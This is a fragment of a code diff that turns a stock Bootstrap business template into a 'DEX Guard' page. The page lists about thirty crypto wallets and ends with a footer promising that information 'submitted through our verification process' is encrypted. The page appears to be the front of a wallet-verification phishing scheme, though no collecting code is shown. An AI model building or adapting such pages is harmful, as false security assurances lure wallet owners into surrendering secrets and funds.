+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Dockery</span>
+                    </div>
+                    <img src="https://dockery.io/favicon.ico" alt="Dockery" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Paper</span>
+                    </div>
+                    <img src="https://paper.xyz/favicon.ico" alt="Paper" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Plair</span>
+                    </div>
+                    <img src="https://plair.life/favicon.ico" alt="Plair" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Proton</span>
+                    </div>
+                    <img src="https://proton.org/favicon.ico" alt="Proton" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Rico</span>
+                    </div>
+                    <img src="https://rico.io/favicon.ico" alt="Rico" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Betterment</span>
+                    </div>
+                    <img src="https://www.betterment.com/favicon.ico" alt="Betterment" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Strax</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/stratis-strax-logo.png" alt="Strax" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Sequence</span>
+                    </div>
+                    <img src="https://sequence.xyz/favicon.ico" alt="Sequence" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Tubetomy</span>
+                    </div>
+                    <img src="https://tubetomy.io/favicon.ico" alt="Tubetomy" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Zelpays</span>
+                    </div>
+                    <img src="https://zelpays.com/favicon.ico" alt="Zelpays" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Vanity</span>
+                    </div>
+                    <img src="https://vanity.io/favicon.ico" alt="Vanity" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Verso</span>
+                    </div>
+                    <img src="https://verso.finance/favicon.ico" alt="Verso" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Wallet3</span>
+                    </div>
+                    <img src="https://wallet3.io/favicon.ico" alt="Wallet3" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Polkadot</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/polkadot-new-dot-logo.png" alt="Polkadot" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Phantasma</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/phantasma-soul-logo.png" alt="Phantasma" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Filecoin</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/filecoin-fil-logo.png" alt="Filecoin" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">IOST</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/iost-iost-logo.png" alt="IOST" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Qtum</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/qtum-qtum-logo.png" alt="Qtum" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Waves</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/waves-waves-logo.png" alt="Waves" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Algorand</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/algorand-algo-logo.png" alt="Algorand" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Zcash</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/zcash-zec-logo.png" alt="Zcash" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Vechain</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/vechain-vet-logo.png" alt="Vechain" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Stellar</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/stellar-xlm-logo.png" alt="Stellar" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Tron</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="Tron" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Terra</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/terra-luna-luna-logo.png" alt="Terra" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Cosmos</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/cosmos-atom-logo.png" alt="Cosmos" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Metis</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/metisdao-metis-logo.png" alt="Metis" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Optimism</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/optimism-ethereum-op-logo.png" alt="Optimism" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Injective</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/injective-inj-logo.png" alt="Injective" class="wallet-logo">
+                </a>
+
             </div>
-          </div><!-- End Service Item -->
-
         </div>
-
-      </div>
-    </section><!-- End Our Services Section -->
-
-    <!-- ======= Our Team Section ======= -->
-    <section id="team" class="team">
-      <div class="container" data-aos="fade-up">
-
-        <div class="section-header">
-          <h2>Your Team</h2>
-          <p>Every faces here brings something powerful to the table, A dedicated team committed to excellence and innovation</p>
-        </div>
-
-        <div class="row gy-4">
-
-          <div class="col-xl-3 col-md-6 d-flex" data-aos="fade-up" data-aos-delay="100">
-            <div class="member">
-              <img src="assets/img/team/team-1.jpg" class="img-fluid" alt="">
-              <h4>Walter White</h4>
-              <span>Web Development</span>
-              <div class="social">
-                <a href=""><i class="bi bi-twitter"></i></a>
-                <a href=""><i class="bi bi-facebook"></i></a>
-                <a href=""><i class="bi bi-instagram"></i></a>
-                <a href=""><i class="bi bi-linkedin"></i></a>
-              </div>
-            </div>
-          </div><!-- End Team Member -->
-
-          <div class="col-xl-3 col-md-6 d-flex" data-aos="fade-up" data-aos-delay="200">
-            <div class="member">
-              <img src="assets/img/team/team-2.jpg" class="img-fluid" alt="">
-              <h4>Sarah Jhinson</h4>
-              <span>Marketing</span>
-              <div class="social">
-                <a href=""><i class="bi bi-twitter"></i></a>
-                <a href=""><i class="bi bi-facebook"></i></a>
-                <a href=""><i class="bi bi-instagram"></i></a>
-                <a href=""><i class="bi bi-linkedin"></i></a>
-              </div>
-            </div>
-          </div><!-- End Team Member -->
-
-          <div class="col-xl-3 col-md-6 d-flex" data-aos="fade-up" data-aos-delay="300">
-            <div class="member">
-              <img src="assets/img/team/team-3.jpg" class="img-fluid" alt="">
-              <h4>William Anderson</h4>
-              <span>Content</span>
-              <div class="social">
-                <a href=""><i class="bi bi-twitter"></i></a>
-                <a href=""><i class="bi bi-facebook"></i></a>
-                <a href=""><i class="bi bi-instagram"></i></a>
-                <a href=""><i class="bi bi-linkedin"></i></a>
-              </div>
-            </div>
-          </div><!-- End Team Member -->
-
-          <div class="col-xl-3 col-md-6 d-flex" data-aos="fade-up" data-aos-delay="400">
-            <div class="member">
-              <img src="assets/img/team/team-4.jpg" class="img-fluid" alt="">
-              <h4>Amanda Jepson</h4>
-              <span>Accountant</span>
-              <div class="social">
-                <a href=""><i class="bi bi-twitter"></i></a>
-                <a href=""><i class="bi bi-facebook"></i></a>
-                <a href=""><i class="bi bi-instagram"></i></a>
-                <a href=""><i class="bi bi-linkedin"></i></a>
-              </div>
-            </div>
-          </div><!-- End Team Member -->
-
-        </div>
-
-      </div>
-    </section><!-- End Our Team Section -->
-
-    <!-- ======= Contact Section ======= -->
-    <section id="contact" class="contact">
-      <div class="container" data-aos="fade-up">
-
-        <div class="section-header">
-          <h2>Contact</h2>
-          <p>Your next big move starts with a massege. Reach out today and lets start something great</p>
-        </div>
-
-        <div class="row gx-lg-0 gy-4">
-
-          <div class="col-lg-4">
-
-            <div class="info-container d-flex flex-column align-items-center justify-content-center">
-              <div class="info-item d-flex">
-                <i class="bi bi-geo-alt flex-shrink-0"></i>
-                <div>
-                  <h4>Location:</h4>
-                  <p>A000 Adam Street, Your City, Your State. 535022</p>
-                </div>
-              </div><!-- End Info Item -->
-
-              <div class="info-item d-flex">
-                <i class="bi bi-envelope flex-shrink-0"></i>
-                <div>
-                  <h4>Email:</h4>
-                  <p>holler3D@gmail.com</p>
-                </div>
-              </div><!-- End Info Item -->
-
-              <div class="info-item d-flex">
-                <i class="bi bi-phone flex-shrink-0"></i>
-                <div>
-                  <h4>Call:</h4>
-                  <p>+2348165404860</p>
-                </div>
-              </div><!-- End Info Item -->
-
-              <div class="info-item d-flex">
-                <i class="bi bi-clock flex-shrink-0"></i>
-                <div>
-                  <h4>Open Hours:</h4>
-                  <p>Mon-Sun: 12AM - 24PM</p>
-                </div>
-              </div><!-- End Info Item -->
-            </div>
-
-          </div>
-
-          <div class="col-lg-8">
-            <form action="forms/contact.php" method="post" role="form" class="php-email-form">
-              <div class="row">
-                <div class="col-md-6 form-group">
-                  <input type="text" name="name" class="form-control" id="name" placeholder="Your Name" required>
-                </div>
-                <div class="col-md-6 form-group mt-3 mt-md-0">
-                  <input type="email" class="form-control" name="email" id="email" placeholder="Your Email" required>
-                </div>
-              </div>
-              <div class="form-group mt-3">
-                <input type="text" class="form-control" name="subject" id="subject" placeholder="Subject" required>
-              </div>
-              <div class="form-group mt-3">
-                <textarea class="form-control" name="message" rows="7" placeholder="Message" required></textarea>
-              </div>
-              <div class="my-3">
-                <div class="loading">Loading</div>
-                <div class="error-message"></div>
-                <div class="sent-message">Your message has been sent. Thank you!</div>
-              </div>
-              <div class="text-center"><button type="submit">Send Message</button></div>
-            </form>
-          </div><!-- End Contact Form -->
-
-        </div>
-
-      </div>
-    </section><!-- End Contact Section -->
-
-  </main><!-- End #main -->
-
-  <!-- ======= Footer ======= -->
-  <footer id="footer" class="footer">
-
-    <div class="container">
-      <div class="row gy-4">
-        <div class="col-lg-5 col-md-12 footer-info">
-          <a href="index.html" class="logo d-flex align-items-center">
-            <span>Impact</span>
-          </a>
-          <p>Our impact goes beyond the surface - we ignite transformation, empower communities, and create meaningful change that lasts. every decision we make is drien by purpose, passion, and progress.</p>
-          <div class="social-links d-flex mt-4">
-            <a href="#" class="twitter"><i class="bi bi-twitter"></i></a>
-            <a href="#" class="facebook"><i class="bi bi-facebook"></i></a>
-            <a href="#" class="instagram"><i class="bi bi-instagram"></i></a>
-            <a href="#" class="linkedin"><i class="bi bi-linkedin"></i></a>
-          </div>
-        </div>
-
-        <div class="col-lg-2 col-6 footer-links">
-          <h4>Useful Links</h4>
-          <ul>
-            <li><a href="#">Home</a></li>
-            <li><a href="#">About us</a></li>
-            <li><a href="#">Services</a></li>
-            <li><a href="#">Terms of service</a></li>
-            <li><a href="#">Privacy policy</a></li>
-          </ul>
-        </div>
-
-        <div class="col-lg-2 col-6 footer-links">
-          <h4>Our Services</h4>
-          <ul>
-            <li><a href="#">Web Design</a></li>
-            <li><a href="#">Web Development</a></li>
-            <li><a href="#">Product Management</a></li>
-            <li><a href="#">Marketing</a></li>
-            <li><a href="#">Graphic Design</a></li>
-          </ul>
-        </div>
-
-        <div class="col-lg-3 col-md-12 footer-contact text-center text-md-start">
-          <h4>Contact Us</h4>
-          <p>
-            Kwang Street <br>
-            Jos South<br>
-            <br><br>
-            <strong>Phone:</strong> +2348165404860<br>
-            <strong>Email:</strong> holler3D@gmail.com<br>
-          </p>
-
-        </div>
-
-      </div>
     </div>
 
-    <div class="container mt-4">
-      <div class="copyright">
-        &copy; Copyright <strong><span>holer3d</span></strong>. All Rights Reserved
-      </div>
-      <div class="credits">
-        <!-- All the links in the footer should remain intact. -->
-        <!-- You can delete the links only if you purchased the pro version. -->
-        <!-- Licensing information: https://bootstrapmade.com/license/ -->
-        <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/impact-bootstrap-business-website-template/ -->
-        Designed by <a href="https://bootstrapmade.com/">Holer3d</a>
-      </div>
+</section>
+
+
+<footer class="footer">
+
+
+    <div class="footer-inner">
+
+
+        <img
+            src="1787770720214.png"
+            alt="DEX GUARD"
+            class="footer-logo"
+        >
+
+
+        <div class="footer-divider"></div>
+
+
+        <h2>
+            Your Privacy &amp; Security
+        </h2>
+
+
+        <p>
+            We take your privacy and data security
+            seriously. All information submitted
+            through our verification process is
+            protected using end-to-end encryption,
+            ensuring that your data remains secure
+            while being transmitted and stored.
+        </p>
+
+
+        <p>
+            Your sensitive information is processed
+            through secure, automated systems with
+            no unnecessary human access or manual
+            interference during transmission. We
+            implement industry-standard security
+            measures to safeguard your personal data
+            against unauthorized access, alteration,
+            disclosure, or misuse.
+        </p>
+
+
+        <p>
+            Your information is used solely for
+            verification and validation purposes and
+            handled in accordance with our privacy
+            and security policies. We are committed
+            to maintaining the highest standards of
+            confidentiality and protecting your trust
+            every step of the way.
+        </p>
+
+
+        <p class="thank-you">
+            Thank you
+        </p>
+
+
+        <p class="copyright">
+
+            © 2023
+            <span>DEX Guard</span>.
+            All rights reserved.
+
+        </p>
+
+
     </div>
 
-  </footer><!-- End Footer -->
-  <!-- End Footer -->
 
-  <a href="#" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+</footer>
 
-  <div id="preloader"></div>
-
-  <!-- Vendor JS Files -->
-  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
-  <script src="assets/vendor/aos/aos.js"></script>
-  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
-  <script src="assets/vendor/purecounter/purecounter_vanilla.js"></script>
-  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
-  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
-  <script src="assets/vendor/php-email-form/validate.js"></script>
-
-  <!-- Template Main JS File -->
-  <script src="assets/js/main.js"></script>
 
 </body>
-
 
 </html>
